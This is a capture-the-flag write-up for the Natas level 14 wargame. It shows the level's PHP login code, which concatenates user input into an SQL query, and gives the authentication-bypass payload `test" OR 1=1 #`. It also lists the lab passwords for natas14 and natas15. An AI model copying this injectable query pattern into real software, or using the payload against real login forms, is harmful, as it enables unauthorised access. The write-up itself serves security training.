# Natas Level 14

> Username: natas14
> Password: A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
> URL: http://natas14.natas.labs.overthewire.org

## Solution

Entering the URL, we found a login fields but we don't have any credentials to enter. So let's view the source code to see if there is any vulnerability.

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

We can see the application inserts user input directly into an SQL query without safely separating data from SQL commands.
That means we can enter something that changes the logic of the SQL query. And this is a vulnerability called `SQL Injection`.

So if we try to enter the payload `test" OR 1=1 #` we gonna successfully enter.

```text
Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
```

```text
GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
```

